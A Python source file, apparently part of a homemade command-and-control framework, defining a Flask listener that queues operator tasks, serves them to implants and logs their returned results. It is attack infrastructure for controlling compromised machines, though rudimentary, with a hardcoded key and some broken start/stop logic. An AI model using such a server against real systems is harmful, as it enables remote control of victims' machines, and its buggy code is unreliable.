import sys
import threading
import uuid
from multiprocessing.context import Process
from random import choice
from string import ascii_uppercase
from common import *
import flask
import json

from agentsHelper import clearAgentTasks, displayResults

from agent import Agent


class Listener:
    def __init__(self, name, port, ip):
        self.flag = 1
        self.name = name
        self.port = port
        self.ip = ip
        self.isRunning = False
        self.Path = "data/listeners/{}".format(self.name)
        self.keyPath = "{}key".format(self.name)
        self.filePath = "{}files/".format(self.Path)
        self.agentsPath = "{}files/".format(self.Path)
        self.app = flask.Flask(__name__)

        # creates the needed directories to store files,
        # and other data like the encryption key and agents’ data
        if not os.path.exists(self.Path):
            os.mkdir(self.Path)
        if not os.path.exists(self.agentsPath):
            os.mkdir(self.agentsPath)
        if not os.path.exists(self.filePath):
            os.mkdir(self.filePath)

        # creates a key, saves it and stores it in a variable
        if not os.path.exists(self.keyPath):
            key = "qqq"
            self.key = key

            with open(self.keyPath, "wt") as f:
                f.write(key)
        else:
            with open(self.keyPath, "rt") as f:
                self.key = f.read()

        # 写tasks
        @self.app.route("/tasks", methods=['POST'])
        def addTasks():
            # creates a random string of 6 uppercase letters as the new agent’s name
            body = flask.request.get_json()
            # print(body)
            # dump 将obj转化为JSON字符串
            # loads将 包含JSON的转化为py obj
            json_obj = json.dumps(body)
            if os.path.exists(self.agentsPath):
                with open(self.agentsPath+"tasks.txt", "a+") as f:
                    f.write(json_obj+"\r\n")
            success("task saved")
            return (json_obj, 200)

        # 读tasks
        @self.app.route("/tasks", methods=['GET'])
        def getTasks():
            if os.path.exists(self.agentsPath):
                with open(self.agentsPath+"tasks.txt", "r") as f:
                    data = f.readline()
                return data, 200
            else:
                return ('failed', 400)

        # 回传结果
        @self.app.route("/res", methods=['POST'])
        def getResults():
            body = flask.request.get_json()
            print("Received implant response: {}".format(body))
            # if str(flask.request.get_json()) != '{}':
            #     body = flask.request.get_json()
            #     print("Received implant response: {}".format(body))
            #     return "OK", 200
            # else:
            if os.path.exists(self.agentsPath):
                with open(self.agentsPath + "tasks.txt", "r") as f:
                    with open(self.agentsPath + "tasks.txt", "r+") as new_file:
                        data = f.readline()
                        # 被删除行的下一行读给 next_line
                        next_line = f.readline()
                        # 连续覆盖剩余行，后面所有行上移一行
                        while next_line:
                            new_file.write(next_line)
                            next_line = f.readline()
                            # 写完最后一行后截断文件，因为删除操作，文件整体少了一行，原文件最后一行需要去掉
                        new_file.truncate()
            return data, 200

    # flask applications don’t provide a reliable way to stop the application
    # only way was to kill the process
    def run(self):
        self.app.logger = True
        self.app.run(port=self.port, host=self.ip)

    def start(self):
        # self.run()的话会打印flask启动日志，不知道为啥
        self.run()
        # self.server = Process(target=self.run)
        # 全局字典，该字典是python启动后就加载在内存中。
        # 每当导入新的模块，sys.modules都将记录这些模块
        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None

        self.daemon = threading.Thread(name=self.name,
                                       target=self.server.start,
                                       args=())
        # whether this thread is a daemon thread
        self.daemon.daemon = True
        self.daemon.start()

        self.isRunning = True

    def stop(self):

        self.server.terminate()
        self.server = None
        self.daemon = None
        self.isRunning = False
